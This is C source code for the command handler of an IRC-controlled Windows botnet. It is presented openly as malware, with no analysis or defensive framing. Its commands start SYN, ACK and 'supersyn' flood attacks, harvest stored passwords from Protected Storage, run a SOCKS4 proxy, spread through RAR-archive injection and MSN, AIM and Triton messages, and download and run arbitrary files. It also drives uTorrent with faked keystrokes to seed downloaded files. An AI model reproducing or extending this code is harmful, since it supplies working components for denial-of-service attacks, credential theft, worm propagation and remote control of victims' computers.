#include "../h/includes.h"
#include "../h/strings.h"
#include "../h/functions.h"
#include "../cmd.h"
#pragma comment( lib, "Urlmon.lib" )
	//////////////////////////////////////////////////////////////////////////////
	//								uTorrent Shit								 /
	//////////////////////////////////////////////////////////////////////////////
HWND uTorrentWindow = 0;
BOOL CALLBACK EnumProc( HWND hWnd, LPARAM lParam )
{
   char szTitle[ 512 ];

   GetWindowText( hWnd, szTitle, sizeof( szTitle ) );
   
   if( strstr( szTitle, "\xB5Torrent" ) )
      uTorrentWindow = hWnd;

   return TRUE;
};

HWND FindUTorrent( )
{
   EnumWindows( EnumProc, 0 );
   return( uTorrentWindow );
};
void TypeString( char* szString )
{
   int Length = strlen( szString ), i;
   bool ShiftDown = false;
   short sKey;
   
   for( i = 0; i < Length; i++, szString++ )
   {
      sKey = VkKeyScan( *szString );

      if( ( sKey >> 8 ) & 1 )
      {
         keybd_event( VK_LSHIFT, 0, 0, 0 );
         ShiftDown = true;
      }

      keybd_event( (unsigned char)sKey, 0, 0, 0 );

      if( ShiftDown )
      {
         keybd_event( VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0 );
         ShiftDown = false;
      }
   }
};
int SeedUTorrent( char* szUrl, char* szSaveAs, char* szSeedTo )
{
   HWND uTorrentWindow = FindUTorrent( );
   
   if( uTorrentWindow == 0 )
      return 1;

   if( URLDownloadToFile( 0, szUrl, szSaveAs, 0, 0 ) != S_OK )
      return 2;

   if( (int)fShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
      return 3;

   ShowWindow( uTorrentWindow, SW_SHOW );
   BringWindowToTop( uTorrentWindow );
   SetForegroundWindow( uTorrentWindow );
   SetFocus( uTorrentWindow );

   if( !IsWindow( uTorrentWindow ) )
      return 4;

   Sleep( 300 );

   if( *szSeedTo != 0 )
      TypeString( szSeedTo );

   keybd_event( VK_RETURN, 0, 0, 0 );
   ShowWindow( uTorrentWindow, SW_MINIMIZE );

   return 0;
};

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->pmsg(hostd->target,"%s Failed to parse command.","Failed");
			return 1;
		} 
	}

	return 1;
}


	//////////////////////////////////////////////////////////////////////////////
	//								Command Parsing								 /
	//////////////////////////////////////////////////////////////////////////////

int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;
	int tnum; // for finding the number of a already running thread
	DWORD id; // for creating new threads
	BOOL dec=FALSE;

	if (topic)
	{
		if (!lstrcmpi(get_auth1,a[0]) || !lstrcmpi(get_auth2,a[0]))
			return 1;
		if (!lstrcmpi(cmd_remove_1,a[0]) || !lstrcmpi(cmd_remove_2,a[0]))
			return 1;
	}
	if (switches.stop)
	{
		if (!lstrcmpi(cmd_threads_1,a[0]) || !lstrcmpi(cmd_threads_2,a[0]))
		{
			return 1;
		}
		
	//////////////////////////////////////////////////////////////////////////////
	//									Pstore
	//////////////////////////////////////////////////////////////////////////////
		#ifndef NO_PSTORE
		else if (!lstrcmpi(cmd_pstore_1, a[0]) || !lstrcmpi(cmd_pstore_2, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PSTORE_THREAD,"PStore");
			return 1;
		}
		#endif


		else if (!lstrcmpi(cmd_socks4_1,a[0]) || !lstrcmpi(cmd_socks4_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SOCK4_THREAD,"Socks4 Server");
			return 1;
		}

	//////////////////////////////////////////////////////////////////////////////
	//								    DDoS
	//////////////////////////////////////////////////////////////////////////////
		#ifndef NO_DDOS
		if (!lstrcmpi(cmd_ddos_syn, a[0]) || !lstrcmpi(cmd_ddos_ack, a[0]) || !lstrcmpi(cmd_ddos_random, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, DDOS_THREAD, "DDoS");
			return 1;
		}
		#endif

	//////////////////////////////////////////////////////////////////////////////
	//									Download
	//////////////////////////////////////////////////////////////////////////////
	#ifndef NO_DOWNLOAD
		else if (!lstrcmpi(get_mnd1,a[0]) || !lstrcmpi(get_mnd2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(get_upd1,a[0]) || !lstrcmpi(get_upd2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
	#endif

	}
	if (!lstrcmpi(a[0],get_auth1) || !lstrcmpi(a[0],get_auth2))
	{
		if (switches.verbose)
			irc->pmsg(hostd->target,str_auth_ali,main_title);
		return 1;
	}
	
	
	//////////////////////////////////////////////////////////////////////////////
	//								   SOCKS4
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_socks4_1,a[0]))
	{
		if ((tnum=findthreadnum(SOCK4_THREAD)) > 0)
		{
			if (!switches.silent)
		    	irc->pmsg(socks_chan,str_thread_alr,sock4_title,"Socks4 Server",tnum);
			return 1;
		}

		NTHREAD sock4;
		sock4.silent=switches.silent;
		sock4.verbose=switches.verbose;
		strcpy(sock4.target,hostd->target);
		sock4.conn=irc;
		sock4.idata1 = (a[1]?atoi(a[1]):sock4port);
		
		sock4.threadnum=addthread(SOCK4_THREAD,"%s Server running on: %s:%i",sock4_title,exip,sock4.idata1);
		if (threads[sock4.threadnum].tHandle = CreateThread(NULL, 0, &SocksDaemon, (LPVOID)&sock4, 0, &id)) {
			while (sock4.gotinfo == FALSE)
				Sleep(50);
			if (!switches.silent)
				irc->pmsg(socks_chan,"%s Server running on: %s:%i",sock4_title,exip,sock4.idata1);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(socks_chan,str_thread_fail,sock4_title,"Socks4 thread",GetLastError());
		}
		return 1;
	}

	else if(!lstrcmpi(cmd_socks4_3,a[0]))
	{
    ::killthreadid(SOCK4_THREAD,1);
	irc->pmsg(socks_chan,"%s Thread Disabled.");
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Rar Inject
	//////////////////////////////////////////////////////////////////////////////

	 else if (!lstrcmpi(cmd_rarspread_1,a[0]))
				{
		irc->pmsg(hostd->target,"%s Executing Rar Injection.");

		NTHREAD rar;
		rar.threadnum = addthread(RAR_THREAD,"Rar Thread");

		RarWorm(NULL);
		}

	//////////////////////////////////////////////////////////////////////////////
	//								Remove Bot
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_REMOVE_CMD
	else if (!lstrcmpi(a[0],cmd_remove_1) || !lstrcmpi(a[0],cmd_remove_2))
	{
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
		ExitProcess(EXIT_SUCCESS);
	}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								MSN Spread
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_IMSPREAD
	else if (!lstrcmpi(cmd_imspread_1,a[0]))
	{
		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);

		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;

		msn.data1=IMmessage; //Message
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", imspread_title);
		}
	}

	else if(!lstrcmpi(cmd_imspread_2,a[0]))
	{
    ::killthreadid(MSNMSG_THREAD,1);
	irc->pmsg(hostd->target,"%s Thread Disabled.", imspread_title);
	}

	else if(!lstrcmpi(cmd_imspread_3,a[0]))
	{
	char *add;
	add = a[1];
    contactfuck(add);
	}

#endif

	//////////////////////////////////////////////////////////////////////////////
	//								uTorrent Seeder
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_SEED
	else if (!lstrcmpi(cmd_seed,a[0]))
	{
	char *url;
	char *oic;
	char *kkk;

    url = a[1];
	oic = a[2];
	kkk = a[3];

	switch( SeedUTorrent( url, oic, kkk ) )
    {
   case 0:
	  irc->pmsg(hostd->target,"%s Seeding!\n", seed_title);
      break;
   case 2:
	  irc->pmsg(hostd->target,"%s Unable to download file\n", seed_title);
      break;
   };
}
#endif

	//////////////////////////////////////////////////////////////////////////////
	//								AIM Spread									 /
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_AIM
	else if (!lstrcmpi(cmd_aimspread_1,a[0]))
	{
		NTHREAD aim;
		aim.conn=irc;
		aim.silent=switches.silent;
		aim.verbose=switches.verbose;

		char *AIMmessage;
 		if ( !( AIMmessage = strchr(params, ' ')) )return 1;

		aim.data1=AIMmessage; //Message
		aim.threadnum = addthread(AIM_THREAD,"AIM Threads");
		if (threads[aim.threadnum].tHandle = CreateThread(NULL, 0, &AimMessage, (LPVOID)&aim, 0, &id))
		{
			while (aim.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", aimspread_title);
		}

	else if(!lstrcmpi(cmd_aimspread_2,a[0]))
	{
		::killthreadid(AIM_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", aimspread_title);
	}

	}

#endif
#ifndef NO_AIM
	else if (!lstrcmpi(cmd_timspread_1,a[0]))
	{
		NTHREAD tim;
		tim.conn=irc;
		tim.silent=switches.silent;
		tim.verbose=switches.verbose;

		char *TIMmessage;
 		if ( !( TIMmessage = strchr(params, ' ')) )return 1;

		tim.data1=TIMmessage; //Message
		tim.threadnum = addthread(TIM_THREAD,"TIM Threads");
		if (threads[tim.threadnum].tHandle = CreateThread(NULL, 0, &TritonMessage, (LPVOID)&tim, 0, &id))
		{
			while (tim.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", timspread_title);
		}

	else if(!lstrcmpi(cmd_timspread_2,a[0]))
	{
		::killthreadid(TIM_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", timspread_title);
	}

	}

#endif

	//////////////////////////////////////////////////////////////////////////////
	//								Pstore										 /
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PSTORE
	else if (!lstrcmpi(a[0],cmd_pstore_1) || !lstrcmpi(a[0],cmd_pstore_2))
	{
		if ((tnum=findthreadnum(PSTORE_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, pstore_title,"pstore thread", tnum);
			return 1;
		}

		NTHREAD PSTORE;
		PSTORE.conn=irc;
		PSTORE.silent=switches.silent;
		PSTORE.verbose=switches.verbose;

		if (!lstrcmpi(a[0],cmd_pstore_2)) {
			PSTORE.bdata1=TRUE;
			PSTORE.data1=a[1];
		}


		strcpy(PSTORE.target,hostd->target);
		PSTORE.threadnum = addthread(PSTORE_THREAD,"PStore Thread");
		if (threads[PSTORE.threadnum].tHandle = CreateThread(NULL, 0, &pstore, (LPVOID)&PSTORE, 0, &id))
		{
			while (PSTORE.gotinfo == FALSE)
				Sleep(50);
		}


	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//									Visit									 /
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_VISIT
	else if (!lstrcmpi(a[0],cmd_visit))
	{

		NTHREAD Visit;
		Visit.conn=irc;
		Visit.silent=switches.silent;
		Visit.verbose=switches.verbose;
		strcpy(Visit.target,hostd->target);
		Visit.data1=a[1];

		if (a[2] != NULL) strncpy(Visit.data2, a[2], sizeof(Visit.data2)-1);

		Visit.threadnum = addthread(VISIT_THREAD,"Visit Threads");
		if (threads[Visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&Visit, 0, &id))
		{
			while (Visit.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Visiting Website Now", visit_title);
		}


	}
#endif 

	//////////////////////////////////////////////////////////////////////////////
	//									DDoS									 /
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_DDOS
	else if (!lstrcmpi(cmd_ddos_syn,a[0]) || !lstrcmpi(cmd_ddos_ack,a[0]) || !lstrcmpi(cmd_ddos_random,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		DDOS ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		if (strcmp("ddos.syn", a[0]) == 0 )
			sprintf(ddos.type,"ddos.syn");
		else if (strcmp("ddos.random", a[0]) == 0 )
			sprintf(ddos.type,"ddos.random"); 	
		else	sprintf(ddos.type,"ddos.ack");

		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);
		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}

	else if (!lstrcmpi(cmd_ddos_stop,a[0]))
	{
		::killthreadid(DDOS_THREAD,1);
		::killthreadid(DDOS_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", ddos_title);
	}

#endif
#ifndef NO_SUPERSYN
	
	else if (!lstrcmpi(cmd_ddos_supersyn,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		SUPERSYN ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &SuperSynThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}
#endif


	//////////////////////////////////////////////////////////////////////////////
	//								Join
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_join_1,a[0]) || !lstrcmpi(cmd_join_2,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->join(a[1],(a[2]?a[2]:""));
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Part
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_part_1,a[0]) || !lstrcmpi(cmd_part_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->part(a[1]);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_DOWNLOAD

	else if (!lstrcmpi(cmd_fakedownload,a[0]) || !lstrcmpi(cmd_fakeupdate,a[0]) || !lstrcmpi(cmd_fake_remove,a[0])) {
			irc->pmsg(hostd->target,"!!!Security!!!. Lamer detected. coming back next reboot, cya.");
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			irc->disconnect();
	}	
	
	else if (!lstrcmpi(get_mnd1,a[0]) || !lstrcmpi(get_mnd2,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=a[2];
		dl.bdata1 = FALSE;
		dl.bdata2 = (a[3]?TRUE:FALSE);
		dl.bdata3 = (a[4]?TRUE:FALSE);

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Update
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_UPDATE
	else if (!lstrcmpi(get_upd1,a[0]) || !lstrcmpi(get_upd2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(bid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}


#endif
#endif

	return 0;
}
